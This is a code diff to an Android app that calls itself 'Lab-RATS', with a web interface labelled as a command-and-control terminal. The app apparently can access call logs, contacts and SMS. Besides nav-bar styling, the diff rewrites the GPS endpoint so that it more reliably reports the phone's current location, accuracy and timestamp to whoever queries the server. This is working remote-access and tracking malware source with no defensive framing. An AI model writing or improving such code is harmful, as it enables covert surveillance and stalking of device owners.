@@ -14,6 +14,7 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
+import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -126,6 +127,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);" +
             "  transform: translateY(-2px);" +
             "}" +
+            ".nav a.active {" +
+            "  background: rgba(0, 242, 255, 0.15);" +
+            "  border-color: var(--neon-cyan);" +
+            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.5);" +
+            "  color: #fff;" +
+            "}" +
             ".card {" +
             "  background: var(--bg-card);" +
             "  border: 1px solid rgba(255, 255, 255, 0.05);" +
@@ -224,7 +231,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
-            "    <div style=\"color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-top: 5px; margin-bottom: 20px;\">C2_TERMINAL_INTERFACE_v7.9.2</div>" +
+            "    <div style=\"color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-top: 5px; margin-bottom: 20px;\">C2_TERMINAL_INTERFACE_V1.3.2</div>" +
             "  </div>" +
             "  <div class=\"nav\">" +
             "    <a href=\"/\">Terminal</a>" +
@@ -240,6 +247,15 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  </div>";
 
     private static final String HTML_FOOTER = "</div>" +
+            "<script>" +
+            "  document.querySelectorAll('.nav a').forEach(link => {" +
+            "    const path = window.location.pathname;" +
+            "    const href = link.getAttribute('href');" +
+            "    if (path === href || (href !== '/' && path.startsWith(href))) {" +
+            "      link.classList.add('active');" +
+            "    }" +
+            "  });" +
+            "</script>" +
             "</body>" +
             "</html>";
 
@@ -1082,34 +1098,69 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveGpsLocate(Map<String, String> params) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                return params.containsKey("json") ? 
-                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted\"}") :
-                    serveError("Location permission not granted.");
-            }
+        boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+        boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+
+        if (!hasFineLocation && !hasCoarseLocation) {
+            return params.containsKey("json") ?
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted. Please ensure location permissions are allowed in app settings.\"}") :
+                    serveError("Location permission not granted. Please ensure location permissions are allowed in app settings.");
         }
 
         try {
             LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
             Location location = null;
-            
-            // Try GPS first
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+            // Try to get fresh location if on Android 11+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                // This is a blocking call for a short time, but we are in a NanoHTTPD worker thread
+                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
+                if (hasFineLocation) {
+                    locationManager.getCurrentLocation(
+                            LocationManager.GPS_PROVIDER,
+                            null,
+                            ContextCompat.getMainExecutor(context),
+                            loc -> future.complete(loc));
+                } else {
+                    locationManager.getCurrentLocation(
+                            LocationManager.NETWORK_PROVIDER,
+                            null,
+                            ContextCompat.getMainExecutor(context),
+                            loc -> future.complete(loc));
+                }
+                
+                try {
+                    location = future.get(5, java.util.concurrent.TimeUnit.SECONDS);
+                } catch (Exception e) {
+                    Log.e("Lab-RATS", "Error getting current location: " + e.getMessage());
+                }
             }
-            
-            // Try Network as fallback
-            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+
+            // Fallback to LastKnownLocation if getCurrentLocation failed or not available
+            if (location == null) {
+                // Try GPS first
+                if (hasFineLocation && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                }
+
+                // Try Network as fallback
+                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                }
+
+                // Try Passive as last resort
+                if (location == null) {
+                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
+                }
             }
 
             if (location != null) {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
-                
+
                 if (params.containsKey("json")) {
-                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f}", lat, lon);
+                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
+                            lat, lon, location.getProvider(), location.getAccuracy(), location.getTime());
                     return newFixedLengthResponse(Response.Status.OK, "application/json", json);
                 }
 
@@ -1118,18 +1169,23 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 response.addHeader("Location", mapsUrl);
                 return response;
             } else {
-                return params.containsKey("json") ? 
-                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Could not retrieve location. Ensure GPS is enabled.\"}") :
-                    serveError("Could not retrieve location. Ensure GPS is enabled on the device.");
+                String errorMsg = "Could not retrieve location. Ensure GPS/Location is enabled on the device and has a clear view of the sky.";
+                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    errorMsg = "Location services are DISABLED on the device. Please enable them.";
+                }
+                
+                return params.containsKey("json") ?
+                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\"}") :
+                        serveError(errorMsg);
             }
         } catch (SecurityException e) {
-            return params.containsKey("json") ? 
-                newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied\"}") :
-                serveError("Location permission denied: " + e.getMessage());
+            return params.containsKey("json") ?
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied: " + e.getMessage() + "\"}") :
+                    serveError("Location permission denied: " + e.getMessage());
         } catch (Exception e) {
-            return params.containsKey("json") ? 
-                newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error\"}") :
-                serveError("Location error: " + e.getMessage());
+            return params.containsKey("json") ?
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
+                    serveError("Location error: " + e.getMessage());
         }
     }
 
